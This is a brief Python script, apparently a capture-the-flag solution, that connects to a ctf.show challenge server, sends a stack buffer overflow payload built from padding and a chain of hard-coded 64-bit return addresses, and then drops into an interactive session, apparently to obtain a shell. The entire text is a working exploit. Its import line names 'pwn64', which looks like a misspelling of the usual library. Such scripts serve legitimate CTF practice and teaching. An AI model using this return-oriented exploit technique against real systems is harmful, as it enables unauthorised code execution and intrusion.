from pwn64 import *
io=remote("pwn.challenge.ctf.show",28267)
payload = b'a'*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)
io.sendline(payload)
io.interactive()